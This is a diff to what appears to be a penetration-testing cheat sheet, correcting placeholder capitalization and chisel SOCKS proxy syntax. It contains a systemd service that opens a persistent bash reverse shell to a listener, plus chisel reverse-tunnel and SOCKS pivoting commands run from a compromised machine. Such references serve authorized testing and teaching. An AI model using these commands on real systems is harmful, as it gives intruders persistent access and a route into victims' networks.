@@ -810,7 +810,7 @@ After=network.target
  
 [Service]
 Type=simple
-ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<listener_ip>/<listener_port> 0>&1'
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<listener_IP>/<listener_port> 0>&1'
 Restart=always
 RestartSec=30
  
@@ -950,7 +950,7 @@ transfer the binary over and start tunneling quickly.
 
 3. On the compromised machine, run the below command to connect back to the attacker
    machine and point connections to a specific IP and port:
-    ./chisel client <listener_ip>:<listener_port> R:<local_tunnel_port>:<target_ip>:<target_port>
+    ./chisel client <listener_IP>:<listener_port> R:<local_tunnel_port>:<target_IP>:<target_port>
 
 4. On the attacker machine you can now interact with the target port by accessing 
    localhost on the port opened on the attacker machine
@@ -977,7 +977,7 @@ Example commands:
 
 2. On the attacker machine, run the below command to connect to the compromised machine
    and bind a local tunnel port to the target IP and port:
-    ./chisel client <listener_ip>:<listener_port> -b <bind_local_tunnel_port>:<target_ip>:<target_port>
+    ./chisel client <listener_IP>:<listener_port> -b <bind_local_tunnel_port>:<target_IP>:<target_port>
 
 3. On the attacker machine you can now interact with the target port by accessing 
    localhost on the port opened on the attacker machine
@@ -1004,16 +1004,16 @@ compromised network as if they were directly connected to the network.
 ### Chisel SOCKS5 Proxying
 ```
 1. On the attacker machine, start the chisel server in SOCKS5 proxy mode:
-    ./chisel server -p <port_to_listen_on> --socks5
+    ./chisel server --reverse -p <port_to_listen_on>
 
 2. On the compromised machine, connect back to the attacker machine and create a
    reverse SOCKS proxy:
-    ./chisel client <listener_ip>:<listener_port> R:socks
+    ./chisel client <listener_IP>:<listener_port> R:<proxy_port>:socks
 
 3. On the attacker machine, add the SOCKS5 proxy to your 'proxychains.conf' file:
-    socks5 <Listener_IP|127.0.0.1> <listener_port>
+    socks5 127.0.0.1 <proxy_port>
 
-4. Use the 'proxychains' command to route traffic through the SOCK5 proxy to the
+4. Use the 'proxychains' command to route traffic through the SOCKS proxy to the
    compromised network.
 
 Example Commands:
@@ -1021,13 +1021,13 @@ Example Commands:
     and the compromised machine's IP is 10.0.0.42.
 
     1. (Attacker machine)
-        ./chisel server -p 9000 --socks5
+        ./chisel server --reverse -p 9000
 
     2. (Compromised machine)
-        ./chisel client 10.0.0.21:9000 R:socks
+        ./chisel client 10.0.0.21:9000 R:9001:socks
     
     3. (Attacker machine)
-        Add 'socks5 127.0.0.1 9000' to 'proxychains.conf'
+        Add 'socks5 127.0.0.1 9001' to 'proxychains.conf'
     
     4. (Attacker machine)
         Use the 'proxychains' command to route your traffic through the proxy
